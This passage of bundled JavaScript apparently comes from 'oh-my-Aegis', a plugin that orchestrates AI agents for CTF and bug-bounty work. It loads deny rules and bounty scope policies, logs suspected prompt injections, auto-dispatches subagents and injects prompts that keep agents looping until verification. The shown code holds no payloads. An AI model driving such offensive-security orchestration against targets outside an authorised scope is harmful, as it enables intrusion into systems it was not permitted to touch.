    }
    claudeDenyCache.lastLoadAt = Date.now();
    claudeDenyCache.sourceMtimeMs = sourceMtimeMs;
    claudeDenyCache.sourcePaths = sourcePaths;
    claudeDenyCache.denyBash = denyBash;
    claudeDenyCache.denyRead = denyRead;
    claudeDenyCache.denyEdit = denyEdit;
    claudeDenyCache.warnings = warnings;
  };
  const getClaudeDenyRules = () => {
    const now = Date.now();
    if (now - claudeDenyCache.lastLoadAt < 60000) {
      return claudeDenyCache;
    }
    loadClaudeDenyRules();
    return claudeDenyCache;
  };
  const claudeRulesCache = {
    lastLoadAt: 0,
    sourceMtimeMs: 0,
    rules: [],
    warnings: []
  };
  const loadClaudeRules = () => {
    const rulesDir = join11(ctx.directory, ".claude", "rules");
    const warnings = [];
    const rules = [];
    let sourceMtimeMs = 0;
    if (!existsSync10(rulesDir)) {
      claudeRulesCache.lastLoadAt = Date.now();
      claudeRulesCache.sourceMtimeMs = 0;
      claudeRulesCache.rules = [];
      claudeRulesCache.warnings = [];
      return;
    }
    const mdFiles = [];
    const walk = (dir, depth) => {
      if (depth > 12)
        return;
      let entries = [];
      try {
        const dirents = readdirSync3(dir, { withFileTypes: true });
        entries = dirents.map((d) => ({
          name: d.name,
          path: join11(dir, d.name),
          isDir: d.isDirectory(),
          isFile: d.isFile()
        }));
      } catch {
        warnings.push(`Failed to scan Claude rules dir: ${relative3(ctx.directory, dir)}`);
        return;
      }
      for (const entry of entries) {
        if (mdFiles.length >= 80) {
          return;
        }
        if (entry.isDir) {
          walk(entry.path, depth + 1);
          continue;
        }
        if (!entry.isFile) {
          continue;
        }
        if (entry.name.toLowerCase().endsWith(".md")) {
          mdFiles.push(entry.path);
        }
      }
    };
    walk(rulesDir, 0);
    const parseFrontmatterPaths = (text) => {
      const lines = text.split(/\r?\n/);
      if (lines.length < 3 || lines[0].trim() !== "---") {
        return { body: text, paths: [] };
      }
      let endIdx = -1;
      for (let i = 1;i < lines.length; i += 1) {
        if (lines[i].trim() === "---") {
          endIdx = i;
          break;
        }
      }
      if (endIdx === -1) {
        return { body: text, paths: [] };
      }
      const fm = lines.slice(1, endIdx);
      const body = lines.slice(endIdx + 1).join(`
`);
      const paths = [];
      let inPaths = false;
      for (const rawLine of fm) {
        const line = rawLine.trimEnd();
        if (!inPaths) {
          if (/^paths\s*:/i.test(line.trim())) {
            inPaths = true;
          }
          continue;
        }
        const m = line.match(/^\s*-\s*(.+)\s*$/);
        if (!m) {
          break;
        }
        let value = (m[1] ?? "").trim();
        if (value.startsWith('"') && value.endsWith('"') || value.startsWith("'") && value.endsWith("'")) {
          value = value.slice(1, -1);
        }
        if (value) {
          paths.push(value);
        }
      }
      return { body, paths };
    };
    for (const filePath of mdFiles) {
      let st;
      try {
        st = statSync4(filePath);
        sourceMtimeMs = Math.max(sourceMtimeMs, st.mtimeMs);
      } catch {
        continue;
      }
      if (!st.isFile()) {
        continue;
      }
      if (st.size > 256 * 1024) {
        warnings.push(`Skipped large Claude rule file: ${relative3(ctx.directory, filePath)}`);
        continue;
      }
      let text = "";
      try {
        text = readFileSync8(filePath, "utf-8");
      } catch {
        warnings.push(`Failed to read Claude rule file: ${relative3(ctx.directory, filePath)}`);
        continue;
      }
      const parsed = parseFrontmatterPaths(text);
      const rel = relative3(ctx.directory, filePath);
      const body = parsed.body.trim();
      const globs = parsed.paths.map((p) => p.trim()).filter(Boolean);
      const res = [];
      for (const glob of globs) {
        try {
          res.push(globToRegExp(glob));
        } catch {
          continue;
        }
      }
      rules.push({
        sourcePath: filePath,
        relPath: rel,
        body,
        pathGlobs: globs,
        pathRes: res
      });
    }
    claudeRulesCache.lastLoadAt = Date.now();
    claudeRulesCache.sourceMtimeMs = sourceMtimeMs;
    claudeRulesCache.rules = rules;
    claudeRulesCache.warnings = warnings;
  };
  const getClaudeRules = () => {
    const now = Date.now();
    if (now - claudeRulesCache.lastLoadAt < 60000) {
      return claudeRulesCache;
    }
    loadClaudeRules();
    return claudeRulesCache;
  };
  const safeNoteWrite = (label, action) => {
    if (!notesReady) {
      return;
    }
    try {
      action();
    } catch {
      notesReady = false;
    }
  };
  const noteHookError = (label, error92) => {
    const message = error92 instanceof Error ? error92.message : String(error92);
    safeNoteWrite(label, () => {
      notesStore.recordScan(`hook-error ${label}: ${message}`);
    });
  };
  const runClaudeCompatHookOrThrow = async (hookName, payload) => {
    const result = await runClaudeHook({
      projectDir: ctx.directory,
      hookName,
      payload,
      timeoutMs: 5000
    });
    if (!result.ok) {
      throw new AegisPolicyDenyError(result.reason);
    }
  };
  const runClaudeCompatHookBestEffort = async (hookName, payload) => {
    const result = await runClaudeHook({
      projectDir: ctx.directory,
      hookName,
      payload,
      timeoutMs: 5000
    });
    if (!result.ok) {
      safeNoteWrite("claude.hook", () => {
        notesStore.recordScan(`Claude hook ${hookName} soft-fail: ${result.reason}`);
      });
    }
  };
  try {
    notesStore.ensureFiles();
  } catch {
    notesReady = false;
  }
  if (configWarnings.length > 0) {
    safeNoteWrite("config.warnings", () => {
      for (const w of configWarnings.slice(0, 20)) {
        notesStore.recordScan(`Config warning: ${w}`);
      }
      if (configWarnings.length > 20) {
        notesStore.recordScan(`Config warning: (${configWarnings.length - 20} more warnings omitted)`);
      }
    });
  }
  const autoCompactLastAtBySession = new Map;
  const AUTO_COMPACT_MIN_INTERVAL_MS = 60000;
  const maybeAutoCompactNotes = (sessionID, reason) => {
    if (!config3.recovery.enabled || !config3.recovery.auto_compact_on_context_failure) {
      return;
    }
    const now = Date.now();
    const last = autoCompactLastAtBySession.get(sessionID) ?? 0;
    if (now - last < AUTO_COMPACT_MIN_INTERVAL_MS) {
      return;
    }
    autoCompactLastAtBySession.set(sessionID, now);
    let actions = [];
    try {
      actions = notesStore.compactNow();
    } catch {
      actions = [];
    }
    safeNoteWrite("recovery.compact", () => {
      notesStore.recordScan(`Auto compact ran: reason=${reason} actions=${actions.join("; ") || "(none)"}`);
    });
  };
  const toastLastAtBySessionKey = new Map;
  const maybeShowToast = async (params) => {
    if (!config3.tui_notifications.enabled) {
      return;
    }
    const toastFn = ctx.client?.tui?.showToast;
    if (typeof toastFn !== "function") {
      return;
    }
    const now = Date.now();
    const throttleMs = config3.tui_notifications.throttle_ms;
    const mapKey = `${params.sessionID}:${params.key}`;
    const last = toastLastAtBySessionKey.get(mapKey) ?? 0;
    if (throttleMs > 0 && now - last < throttleMs) {
      return;
    }
    toastLastAtBySessionKey.set(mapKey, now);
    const title = params.title.slice(0, 80);
    const message = params.message.slice(0, 240);
    const duration5 = params.durationMs ?? 4000;
    try {
      await toastFn({
        directory: ctx.directory,
        title,
        message,
        variant: params.variant,
        duration: duration5
      });
      return;
    } catch (error92) {}
    try {
      await toastFn({
        query: { directory: ctx.directory },
        body: {
          title,
          message,
          variant: params.variant,
          duration: duration5
        }
      });
    } catch (error92) {}
  };
  const sendSessionPromptAsync = async (sessionID, text, metadata) => {
    const promptAsync = ctx.client?.session?.promptAsync;
    if (typeof promptAsync !== "function") {
      return false;
    }
    const payload = {
      parts: [
        {
          type: "text",
          text,
          synthetic: true,
          metadata
        }
      ]
    };
    const fn = promptAsync;
    const attempts = [
      { path: { id: sessionID }, body: payload },
      { query: { id: sessionID }, body: payload },
      { sessionID, body: payload }
    ];
    for (const args of attempts) {
      try {
        await fn(args);
        return true;
      } catch {}
    }
    return false;
  };
  const maybeAutoloopTick = async (sessionID, trigger) => {
    if (!config3.auto_loop.enabled) {
      return;
    }
    const state = store.get(sessionID);
    if (!state.modeExplicit) {
      return;
    }
    if (!state.autoLoopEnabled) {
      return;
    }
    if (config3.auto_loop.only_when_ultrawork && !state.ultraworkEnabled) {
      return;
    }
    if (config3.auto_loop.stop_on_verified && state.mode === "CTF" && state.latestVerified.trim().length > 0) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.stop", () => {
        notesStore.recordScan("Auto loop stopped: verified output present.");
      });
      await maybeShowToast({
        sessionID,
        key: "autoloop_stop_verified",
        title: "oh-my-Aegis: autoloop stopped",
        message: "Verified output present; autoloop disabled.",
        variant: "info"
      });
      return;
    }
    const now = Date.now();
    if (state.autoLoopLastPromptAt > 0 && now - state.autoLoopLastPromptAt < config3.auto_loop.idle_delay_ms) {
      return;
    }
    if (state.autoLoopIterations >= config3.auto_loop.max_iterations) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.stop", () => {
        notesStore.recordScan(`Auto loop stopped: max iterations reached (${config3.auto_loop.max_iterations}).`);
      });
      return;
    }
    const decision = route(state, config3);
    const iteration = state.autoLoopIterations + 1;
    const promptText = [
      "[oh-my-Aegis auto-loop]",
      `trigger=${trigger} iteration=${iteration}`,
      `next_route=${decision.primary}`,
      "Rules:",
      "- Build/update a short execution plan first, then reflect it in todowrite.",
      "- Keep 2-6 TODO items when possible; allow multiple pending items but only one in_progress.",
      "- Execute via the next_route (use the task tool once).",
      "- Record progress with ctf_orch_event and stop this turn."
    ].join(`
`);
    const promptAvailable = typeof ctx.client?.session?.promptAsync === "function";
    if (!promptAvailable) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: client.session.promptAsync unavailable.");
      });
      return;
    }
    store.recordAutoLoopPrompt(sessionID);
    safeNoteWrite("autoloop.tick", () => {
      notesStore.recordScan(`Auto loop tick: session=${sessionID} route=${decision.primary} (${trigger})`);
    });
    try {
      const sent = await sendSessionPromptAsync(sessionID, promptText, {
        source: "oh-my-Aegis.auto-loop",
        iteration,
        next_route: decision.primary
      });
      if (sent) {
        return;
      }
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: failed to send promptAsync.");
      });
      noteHookError("autoloop", new Error("promptAsync failed for all supported payload shapes"));
    } catch (error92) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: failed to send promptAsync.");
      });
      noteHookError("autoloop", error92);
    }
  };
  const getBountyScopePolicy = () => {
    const now = Date.now();
    if (now - scopePolicyCache.lastLoadAt < 60000) {
      return scopePolicyCache.result.ok ? scopePolicyCache.result.policy : null;
    }
    scopePolicyCache.lastLoadAt = now;
    const result = loadScopePolicyFromWorkspace(ctx.directory, {
      candidates: config3.bounty_policy.scope_doc_candidates,
      includeApexForWildcardAllow: config3.bounty_policy.include_apex_for_wildcard_allow
    });
    scopePolicyCache.result = result;
    if (result.ok) {
      const changed = scopePolicyCache.sourcePath !== result.policy.sourcePath || scopePolicyCache.sourceMtimeMs !== result.policy.sourceMtimeMs;
      scopePolicyCache.sourcePath = result.policy.sourcePath;
      scopePolicyCache.sourceMtimeMs = result.policy.sourceMtimeMs;
      if (changed) {
        safeNoteWrite("scope.policy", () => {
          notesStore.recordScan(`Scope doc loaded: ${result.policy.sourcePath} (allow=${result.policy.allowedHostsExact.length + result.policy.allowedHostsSuffix.length}, deny=${result.policy.deniedHostsExact.length + result.policy.deniedHostsSuffix.length}, blackout=${result.policy.blackoutWindows.length})`);
          for (const w of result.policy.warnings) {
            notesStore.recordScan(`Scope doc warning: ${w}`);
          }
        });
      }
      return result.policy;
    }
    return null;
  };
  const store = new SessionStore(ctx.directory, ({ sessionID, state, reason }) => {
    safeNoteWrite("observer", () => {
      notesStore.recordChange(sessionID, state, reason, route(state, config3));
    });
  }, config3.default_mode, config3.notes.root_dir);
  const sessionRecoveryManager = createSessionRecoveryManager({
    client: ctx.client,
    directory: ctx.directory,
    notesStore,
    config: config3,
    store
  });
  const contextWindowRecoveryManager = createContextWindowRecoveryManager({
    client: ctx.client,
    directory: ctx.directory,
    notesStore,
    config: config3,
    store,
    getDefaultModel: (sessionID) => {
      const state = store.get(sessionID);
      const model = state.lastTaskModel.trim().length > 0 ? state.lastTaskModel.trim() : state.lastTaskSubagent ? agentModel(state.lastTaskSubagent) : undefined;
      return model ?? agentModel("aegis-exec");
    }
  });
  if (!config3.enabled) {
    return {};
  }
  configureParallelPersistence(ctx.directory, config3.notes.root_dir);
  const parallelBackgroundManager = new ParallelBackgroundManager({
    client: ctx.client,
    directory: ctx.directory,
    config: config3
  });
  const controlTools = createControlTools(store, notesStore, config3, ctx.directory, ctx.client, parallelBackgroundManager);
  const readiness = buildReadinessReport(ctx.directory, notesStore, config3);
  if (notesReady && (!readiness.ok || readiness.warnings.length > 0)) {
    const entries = [];
    if (readiness.checkedConfigPath) {
      entries.push(`config=${readiness.checkedConfigPath}`);
    }
    if (readiness.issues.length > 0) {
      entries.push(`issues=${readiness.issues.join("; ")}`);
    }
    if (readiness.warnings.length > 0) {
      entries.push(`warnings=${readiness.warnings.join("; ")}`);
    }
    safeNoteWrite("readiness", () => {
      notesStore.recordScan(`Readiness check: ${entries.join(" | ")}`);
    });
  }
  return {
    event: async ({ event }) => {
      try {
        if (!event || typeof event !== "object") {
          return;
        }
        const e = event;
        const type = typeof e.type === "string" ? e.type : "";
        const props = e.properties ?? {};
        parallelBackgroundManager.handleEvent(type, props);
        await sessionRecoveryManager.handleEvent(type, props);
        await contextWindowRecoveryManager.handleEvent(type, props);
        if (type === "session.idle") {
          const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
          if (sessionID) {
            await maybeAutoloopTick(sessionID, "session.idle");
          }
          return;
        }
        if (type === "session.status") {
          const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
          const status = props.status;
          if (sessionID && status?.type === "idle") {
            await maybeAutoloopTick(sessionID, "session.status idle");
          }
        }
      } catch (error92) {
        noteHookError("event", error92);
      }
    },
    config: async (runtimeConfig) => {
      try {
        if (config3.enable_builtin_mcps) {
          const existingMcp = runtimeConfig.mcp ?? {};
          const builtinMcps = createBuiltinMcps({
            projectDir: ctx.directory,
            disabledMcps: config3.disabled_mcps,
            memoryStorageDir: config3.memory.storage_dir
          });
          const merged = {
            ...builtinMcps,
            ...existingMcp
          };
          const builtinMemory = builtinMcps["memory"];
          if (builtinMemory) {
            const existingMemory = existingMcp["memory"];
            const env = existingMemory && existingMemory.type === "local" && existingMemory.environment ? existingMemory.environment : null;
            const filePath = env && typeof env.MEMORY_FILE_PATH === "string" ? env.MEMORY_FILE_PATH : "";
            const keepExisting = Boolean(filePath) && isAbsolute4(filePath) && isPathInsideRoot(filePath, ctx.directory);
            if (!keepExisting) {
              merged.memory = builtinMemory;
            }
          }
          runtimeConfig.mcp = merged;
        }
        const existingAgents = isRecord8(runtimeConfig.agent) ? runtimeConfig.agent : {};
        const defaultModel = typeof runtimeConfig.model === "string" ? runtimeConfig.model : undefined;
        const nextAgents = { ...existingAgents };
        const ensureHiddenInternalSubagent = (name, factory) => {
          const current = nextAgents[name];
          if (isRecord8(current)) {
            nextAgents[name] = { ...current, mode: "subagent", hidden: true };
            return;
          }
          const seeded = factory();
          nextAgents[name] = { ...seeded, mode: "subagent", hidden: true };
        };
        const existingAegis = nextAgents.Aegis;
        if (isRecord8(existingAegis)) {
          const existingPermission = isRecord8(existingAegis.permission) ? existingAegis.permission : {};
          nextAgents.Aegis = {
            ...existingAegis,
            mode: "primary",
            hidden: false,
            permission: {
              ...existingPermission,
              edit: "deny",
              bash: "deny",
              webfetch: "deny",
              external_directory: "deny",
              doom_loop: "deny"
            }
          };
        } else {
          nextAgents.Aegis = createAegisOrchestratorAgent(defaultModel);
        }
        ensureHiddenInternalSubagent("aegis-plan", () => createAegisPlanAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-exec", () => createAegisExecAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-deep", () => createAegisDeepAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-explore", () => createAegisExploreAgent());
        ensureHiddenInternalSubagent("aegis-librarian", () => createAegisLibrarianAgent());
        runtimeConfig.agent = nextAgents;
      } catch (error92) {
        noteHookError("config", error92);
      }
    },
    tool: {
      ...controlTools
    },
    "chat.message": async (input, output) => {
      try {
        const state = store.get(input.sessionID);
        const role = output.message?.role;
        const isUserMessage = role === "user";
        let ultraworkEnabled = state.ultraworkEnabled;
        const messageText = textFromParts(output.parts);
        const contextText = [textFromUnknown(input), messageText].filter(Boolean).join(`
`);
        if (isUserMessage && /\b(ultrawork|ulw)\b/i.test(contextText)) {
          store.setUltraworkEnabled(input.sessionID, true);
          store.setAutoLoopEnabled(input.sessionID, true);
          ultraworkEnabled = true;
          safeNoteWrite("ultrawork.enabled", () => {
            notesStore.recordScan("Ultrawork enabled by keyword in user prompt.");
          });
        }
        if (isUserMessage) {
          const ultrathinkRe = /(^|\n)\s*ultrathink\s*(\n|$)/i;
          const thinkRe = /(^|\n)\s*(think-mode|think\s+mode|think)\s*(\n|$)/i;
          if (ultrathinkRe.test(messageText)) {
            store.setThinkMode(input.sessionID, "ultrathink");
            safeNoteWrite("thinkmode", () => {
              notesStore.recordScan("Think mode set by user keyword: ultrathink.");
            });
          } else if (thinkRe.test(messageText)) {
            store.setThinkMode(input.sessionID, "think");
            safeNoteWrite("thinkmode", () => {
              notesStore.recordScan("Think mode set by user keyword: think.");
            });
          }
        }
        if (config3.enable_injection_logging && notesReady) {
          const indicators = detectInjectionIndicators(contextText);
          if (indicators.length > 0) {
            safeNoteWrite("chat.message.injection", () => {
              notesStore.recordInjectionAttempt("chat.message", indicators, contextText);
            });
          }
        }
        const modeMatch = messageText.match(/\bMODE\s*:\s*(CTF|BOUNTY)\b/i);
        if (modeMatch) {
          store.setMode(input.sessionID, modeMatch[1].toUpperCase());
        } else if (isUserMessage) {
          if (/\bctf\b/i.test(messageText)) {
            store.setMode(input.sessionID, "CTF");
          } else if (/\bbounty\b/i.test(messageText)) {
            store.setMode(input.sessionID, "BOUNTY");
          }
        } else if (config3.enforce_mode_header) {
          const parts = output.parts;
          parts.unshift({
            type: "text",
            text: `MODE: ${state.mode}`
          });
        }
        if (config3.target_detection.enabled) {
          const lockAfterFirst = config3.target_detection.lock_after_first;
          const onlyInScan = config3.target_detection.only_in_scan;
          const canSetTarget = (!onlyInScan || state.phase === "SCAN") && (!lockAfterFirst || state.targetType === "UNKNOWN");
          if (canSetTarget) {
            const target = detectTargetType(contextText);
            if (target) {
              store.setTargetType(input.sessionID, target);
            }
          }
        }
        if (state.mode === "CTF" && (state.targetType === "PWN" || state.targetType === "REV")) {
          const parityRequirement = detectDockerParityRequirement(ctx.directory);
          if (parityRequirement.required) {
            store.setEnvParityRequired(input.sessionID, true, parityRequirement.reason);
          }
        }
        const freeTextSignalsEnabled = config3.allow_free_text_signals || ultraworkEnabled;
        if (freeTextSignalsEnabled) {
          const canApplyScopeConfirmedFromText = state.mode !== "BOUNTY";
          if (/\bscan_completed\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "scan_completed");
          }
          if (/\bplan_completed\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "plan_completed");
          }
          if (/\bverify_success\b/i.test(messageText)) {
            const evidence = extractVerifierEvidence(messageText, state.latestCandidate);
            if (evidence) {
              store.setVerified(input.sessionID, evidence);
              store.applyEvent(input.sessionID, "verify_success");
            }
          }
          if (/\bverify_fail\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "verify_fail");
          }
          if (/\bno_new_evidence\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "no_new_evidence");
          }
          if (/\bsame_payload_(repeat|repeated)\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "same_payload_repeat");
          }
          if (/\bnew_evidence\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "new_evidence");
          }
          if (/\breadonly_inconclusive\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "readonly_inconclusive");
          }
          if (/\breset_loop\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "reset_loop");
          }
          if (canApplyScopeConfirmedFromText && /\bscope_confirmed\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "scope_confirmed");
          }
          if (/\bcandidate_found\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "candidate_found");
          }
          if (canApplyScopeConfirmedFromText && /\bscope\s+confirmed\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "scope_confirmed");
          }
          if (/\bcandidate\s*found\b/i.test(messageText)) {
            store.applyEvent(input.sessionID, "candidate_found");
          }
        }
      } catch (error92) {
        noteHookError("chat.message", error92);
      }
    },
    "tool.execute.before": async (input, output) => {
      try {
        await runClaudeCompatHookOrThrow("PreToolUse", {
          session_id: input.sessionID,
          call_id: input.callID,
          tool_name: input.tool,
          tool_input: isRecord8(output.args) ? output.args : {}
        });
        const stateForGate = store.get(input.sessionID);
        const isAegisOrCtfTool = input.tool.startsWith("ctf_") || input.tool.startsWith("aegis_");
        const modeActivationBypassTools = new Set(["ctf_orch_set_mode", "ctf_orch_status"]);
        if (!stateForGate.modeExplicit && isAegisOrCtfTool && !modeActivationBypassTools.has(input.tool)) {
          throw new AegisPolicyDenyError("oh-my-Aegis is inactive until mode is explicitly declared. Use `MODE: CTF`, `MODE: BOUNTY`, or run `ctf_orch_set_mode` first.");
        }
        if (input.tool === "todowrite") {
          const state2 = store.get(input.sessionID);
          const args = isRecord8(output.args) ? output.args : {};
          const todos = Array.isArray(args.todos) ? args.todos : [];
          args.todos = todos;
          if (config3.enforce_todo_single_in_progress) {
            const count = inProgressTodoCount(args);
            if (count > 1) {
              let seen = false;
              for (const todo of todos) {
                if (!isRecord8(todo) || todo.status !== "in_progress") {
                  continue;
                }
                if (!seen) {
                  seen = true;
                  continue;
                }
                todo.status = "pending";
              }
              safeNoteWrite("todowrite.guard", () => {
                notesStore.recordScan("Normalized todowrite payload: only one in_progress item is allowed.");
              });
            }
          }
          if (config3.enforce_todo_flow_non_scan && state2.phase !== "SCAN") {
            const terminalCtfSuccess = state2.mode === "CTF" && state2.latestVerified.trim().length > 0;
            const minTodos = Math.max(1, Math.floor(config3.todo_min_items_non_scan));
            if (!terminalCtfSuccess && todos.length === 0) {
              todos.push({
                content: "Start the next concrete TODO step.",
                status: "in_progress",
                priority: "high"
              });
            }
            if (!terminalCtfSuccess && config3.enforce_todo_granularity_non_scan && todos.length < minTodos) {
              const missing = minTodos - todos.length;
              for (let i = 0;i < missing; i += 1) {
                todos.push({
                  content: `Break down remaining work into smaller TODO #${i + 1}.`,
                  status: "pending",
                  priority: "medium"
                });
              }
              safeNoteWrite("todowrite.granularity", () => {
                notesStore.recordScan(`Todo granularity enforced (non-SCAN): expanded todo set to at least ${minTodos} items.`);
              });
            }
            const counts = todoStatusCounts(todos);
            if (!terminalCtfSuccess && counts.pending > 0 && counts.inProgress === 0) {
              for (const todo of todos) {
                if (!isRecord8(todo) || todo.status !== "pending") {
                  continue;
                }
                todo.status = "in_progress";
                break;
              }
              safeNoteWrite("todowrite.flow", () => {
                notesStore.recordScan("Todo flow enforced (non-SCAN): promoted next pending item to in_progress after completion update.");
              });
            }
            const finalCounts = todoStatusCounts(todos);
            if (!terminalCtfSuccess && finalCounts.open === 0 && todos.length > 0) {
              todos.push({
                content: "Continue with the next TODO after updating the completed step.",
                status: "in_progress",
                priority: "high"
              });
              safeNoteWrite("todowrite.flow", () => {
                notesStore.recordScan("Todo flow enforced (non-SCAN): prevented terminal closure without an active next TODO step.");
              });
            }
          }
          if (state2.ultraworkEnabled && state2.mode === "CTF" && state2.latestVerified.trim().length === 0) {
            const hasOpenTodo = todos.some((todo) => isRecord8(todo) && (todo.status === "pending" || todo.status === "in_progress"));
            if (!hasOpenTodo) {
              const decision2 = route(state2, config3);
              todos.push({
                content: `Continue CTF loop via '${decision2.primary}' until verify_success (no early stop).`,
                status: "pending",
                priority: "high"
              });
              safeNoteWrite("todowrite.continuation", () => {
                notesStore.recordScan(`Todo continuation enforced (ultrawork): added pending item for route '${decision2.primary}'.`);
              });
            }
          }
          output.args = args;
          return;
        }
        if (input.tool === "read") {
          const args = isRecord8(output.args) ? output.args : {};
          const filePath = typeof args.filePath === "string" ? args.filePath : "";
          if (filePath) {
            const rules = getClaudeDenyRules();
            if (rules.denyRead.length > 0) {
              const resolvedTarget = isAbsolute4(filePath) ? resolve4(filePath) : resolve4(ctx.directory, filePath);
              const normalized = normalizePathForMatch(resolvedTarget);
              const denied = rules.denyRead.find((rule) => rule.re.test(normalized));
              if (denied) {
                throw new AegisPolicyDenyError(`Claude settings denied Read: ${denied.raw}`);
              }
            }
            readContextByCallId.set(input.callID, { sessionID: input.sessionID, filePath });
          }
        }
        if (input.tool === "edit" || input.tool === "write") {
          const args = isRecord8(output.args) ? output.args : {};
          const pathKeys = ["filePath", "path", "file", "filename"];
          let filePath = "";
          for (const key of pathKeys) {
            const value = args[key];
            if (typeof value === "string" && value.trim().length > 0) {
              filePath = value.trim();
              break;
            }
          }
          if (filePath) {
            const rules = getClaudeDenyRules();
            if (rules.denyEdit.length > 0) {
              const resolvedTarget = isAbsolute4(filePath) ? resolve4(filePath) : resolve4(ctx.directory, filePath);
              const normalized = normalizePathForMatch(resolvedTarget);
              const denied = rules.denyEdit.find((rule) => rule.re.test(normalized));
              if (denied) {
                throw new AegisPolicyDenyError(`Claude settings denied Edit: ${denied.raw}`);
              }
            }
          }
        }
        if (input.tool === "task") {
          const state2 = store.get(input.sessionID);
          const args = output.args ?? {};
          if (!state2.modeExplicit) {
            output.args = args;
            return;
          }
          const decision2 = route(state2, config3);
          const routePinned = isNonOverridableSubagent(decision2.primary);
          const userCategory = typeof args.category === "string" ? args.category : "";
          const userSubagent = typeof args.subagent_type === "string" ? args.subagent_type : "";
          let dispatchModel = "";
          const AUTO_PARALLEL_MARKER = "[oh-my-Aegis auto-parallel]";
          const hasAutoParallelMarker = typeof args.prompt === "string" && args.prompt.includes(AUTO_PARALLEL_MARKER);
          const activeParallelGroup = getActiveGroup(input.sessionID);
          const hasUserTaskOverride = typeof args.subagent_type === "string" && args.subagent_type.trim().length > 0 || typeof args.category === "string" && args.category.trim().length > 0 || typeof args.model === "string" && args.model.trim().length > 0 || typeof args.variant === "string" && args.variant.trim().length > 0;
          const ctfScanRouteSet = new Set(Object.values(config3.routing.ctf.scan).map((name) => baseAgentName(String(name))));
          const bountyScanRouteSet = new Set(Object.values(config3.routing.bounty.scan).map((name) => baseAgentName(String(name))));
          const basePrimary = baseAgentName(decision2.primary);
          const hasPrimaryProfileOverride = Boolean(state2.subagentProfileOverrides[basePrimary]);
          const alternatives = state2.alternatives.map((item) => item.trim()).filter((item) => item.length > 0).slice(0, 3);
          const isCtfParallelScanCandidate = state2.mode === "CTF" && ctfScanRouteSet.has(basePrimary);
          const isBountyParallelScanCandidate = state2.mode === "BOUNTY" && state2.scopeConfirmed && bountyScanRouteSet.has(basePrimary);
          const shouldAutoParallelScan = config3.parallel.auto_dispatch_scan && (isCtfParallelScanCandidate || isBountyParallelScanCandidate) && state2.phase === "SCAN" && !state2.pendingTaskFailover && state2.taskFailoverCount === 0 && !hasUserTaskOverride && !hasPrimaryProfileOverride && !activeParallelGroup && !hasAutoParallelMarker;
          const shouldAutoParallelHypothesis = config3.parallel.auto_dispatch_hypothesis && state2.mode === "CTF" && state2.phase !== "SCAN" && basePrimary === "ctf-hypothesis" && !state2.pendingTaskFailover && !hasUserTaskOverride && alternatives.length >= 2 && !activeParallelGroup && !hasAutoParallelMarker;
          const autoParallelForced = shouldAutoParallelScan || shouldAutoParallelHypothesis;
          if (autoParallelForced) {
            const userPrompt = typeof args.prompt === "string" ? args.prompt.trim() : "";
            const basePrompt = userPrompt.length > 0 ? userPrompt : "Continue CTF orchestration with delegated tracks.";
            if (shouldAutoParallelScan) {
              const autoParallelMode = state2.mode === "BOUNTY" ? "BOUNTY" : "CTF";
              const safetyLine = state2.mode === "BOUNTY" ? "- Keep actions scope-safe and minimal-impact during scan tracks." : "- Do not run direct domain execution before dispatch.";
              args.prompt = [
                basePrompt,
                "",
                AUTO_PARALLEL_MARKER,
                `mode=${autoParallelMode} phase=SCAN`,
                "- Immediately run ctf_parallel_dispatch plan=scan with challenge_description derived from available context.",
                safetyLine,
                "- While tracks run, check ctf_parallel_status and then merge with ctf_parallel_collect.",
                "- Choose winner when clear, then update plan + TODO list (multiple todos allowed, one in_progress)."
              ].join(`
`);
            } else {
              const hypothesesPayload = JSON.stringify(alternatives.map((hypothesis) => ({
                hypothesis,
                disconfirmTest: "Run one cheapest disconfirm test and return verifier-aligned evidence."
              })));
              args.prompt = [
                basePrompt,
                "",
                AUTO_PARALLEL_MARKER,
                "mode=CTF phase=PLAN_OR_EXECUTE",
                "- Immediately run ctf_parallel_dispatch plan=hypothesis with the provided hypotheses JSON.",
                `- hypotheses=${hypothesesPayload}`,
                "- While tracks run, check ctf_parallel_status and then merge with ctf_parallel_collect.",
                "- Declare winner if clear, then update plan + TODO list (multiple todos allowed, one in_progress)."
              ].join(`
`);
            }
            args.subagent_type = "aegis-deep";
            if ("category" in args) {
              delete args.category;
            }
            store.setLastTaskCategory(input.sessionID, "aegis-deep");
            store.setLastDispatch(input.sessionID, decision2.primary, "aegis-deep");
            safeNoteWrite("task.auto_parallel", () => {
              notesStore.recordScan(`Auto parallel dispatch armed: session=${input.sessionID} scan=${shouldAutoParallelScan} hypothesis=${shouldAutoParallelHypothesis}`);
            });
          }
          if (config3.auto_dispatch.enabled && !autoParallelForced) {
            const dispatch = decideAutoDispatch(decision2.primary, state2, config3.auto_dispatch.max_failover_retries, config3);
            dispatchModel = typeof dispatch.model === "string" ? dispatch.model.trim() : "";
            const hasUserCategory = typeof args.category === "string" && args.category.length > 0;
            const hasUserSubagent = typeof args.subagent_type === "string" && args.subagent_type.length > 0;
            const shouldForceFailover = state2.pendingTaskFailover;
            const hasUserDispatch = hasUserCategory || hasUserSubagent;
